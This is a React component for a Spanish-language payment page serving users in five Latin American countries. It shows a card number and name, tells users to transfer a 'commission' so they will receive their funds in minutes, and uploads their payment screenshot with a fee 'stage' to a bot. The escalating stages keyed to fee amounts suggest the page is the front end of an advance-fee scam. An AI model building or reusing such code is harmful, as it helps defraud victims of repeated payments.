import { useNavigate, useSearchParams } from "react-router-dom";
import CopyTextElement from "./CopyText";
import { useEffect, useState } from "react";
import { getCards, sendPhoto } from "../../../util/back/requests";

const UsdInputSecond = () => {
  const [searchParams] = useSearchParams();
  const currency = searchParams.get("currency");
  const country = searchParams.get("country");
  const [card, setCard] = useState();
  const priceAmount = localStorage.getItem("priceAmount");
  const [selectedFile, setSelectedFile] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const [isError, setIsError] = useState(false);

  useEffect(() => {
    const fetchCards = async () => {
      const response = await getCards();
      const activeCard = response.find((el) => el.currency == country);
      setCard(activeCard);
    };
    fetchCards();
  }, [country]);

  const handleFileChange = (event) => {
    setIsError(false);
    const file = event.target.files[0];
    if (file) {
      setSelectedFile(file);
      console.log("Selected file:", file);
    }
  };

  const submitHandler = async () => {
    if (!selectedFile) {
      return setIsError(true);
    }
    if (isLoading) {
      return;
    }
    if (priceAmount == 19) {
      localStorage.removeItem("statusOrder");
      localStorage.removeItem("priceAmount");
      navigate("/menu/wallet");
      return;
    }
    localStorage.setItem("statusOrder", "WAITING");
    setIsLoading(true);
    const formData = new FormData();
    formData.append("image", selectedFile);
    const stage =
      priceAmount == 7
        ? 1
        : priceAmount == 9
          ? 2
          : priceAmount == 14
            ? 3
            : priceAmount == 17
              ? 4
              : 5;
    const countryToBot =
      country == "ARS"
        ? "Argentina"
        : country == "COP"
          ? "Columbia"
          : country == "CLP"
            ? "Chilie"
            : country == "MXN"
              ? "Mexico"
              : "Ecuador";
    const price = currency * priceAmount + " " + country;
    const response = await sendPhoto(formData, price, stage, countryToBot);
    if (response) {
      navigate("/menu/wallet");
    } else {
      setIsError(true);
      setIsLoading(false);
    }
  };

  return (
    <>
      <div className="text-center text-[14px]">
        Transfiera la comisión a esta tarjeta, tras lo cual recibirá sus fondos
        en 3-5 minutos
      </div>
      <div className="pt-2 pb-1 max-xsmall:pt-1">Número de tarjeta:</div>
      <CopyTextElement text={card?.details}>{card?.details}</CopyTextElement>
      <div className="pt-2 pb-1 max-xsmall:pt-1">NOMBRE:</div>
      <CopyTextElement text={card?.Fio}>{card?.Fio}</CopyTextElement>
      <div className="pt-2 pb-1">Suma:</div>
      <CopyTextElement text={currency * priceAmount}>
        {currency * priceAmount} {country}
      </CopyTextElement>
      <input
        type="file"
        accept="image/*"
        id="fileInput"
        style={{ display: "none" }}
        onChange={handleFileChange}
      />
      {/* Кнопка для виклику input */}
      <div className="flex gap-2 justify-center items-center py-2">
        <button
          onClick={() => document.getElementById("fileInput").click()}
          className={`${isError ? "border-2 border-red-600" : ""}`}
          style={{
            padding: "10px 25px",
            backgroundColor: "#E7FF2B",
            color: "#37C100",
            borderRadius: "5px",
            cursor: "pointer",
            marginTop: "10px",
          }}
        >
          Añade tu captura de pantalla
        </button>

        {/* Відображення вибраного файлу */}
      </div>
      {selectedFile && (
        <div className="w-full text-center">
          <p>Fichero seleccionado: {selectedFile.name}</p>
        </div>
      )}
      <div className="pt-1 pb-1 text-center text-[12px] mt-1  max-xsmall:pt-1">
        {" "}
        Tras el pago, haz clic en el botón &apos;añade tu captura de
        pantalla&apos; y envía una captura de pantalla de la transacción a
        nuestro soporte
      </div>

      <div className="w-full mt-4">
        <button
          onClick={submitHandler}
          className="text-[#37C100] w-full bg-[#E7FF2B] text-[28px] max-xsmall:text-[24px] rounded-[28px] py-[12px] max-xsmall:py-[10px] mt-[2px]  max-xsmall:text-[20px]"
        >
          {isLoading ? "Enviando..." : "Pagado"}
        </button>
      </div>
    </>
  );
};

export default UsdInputSecond;
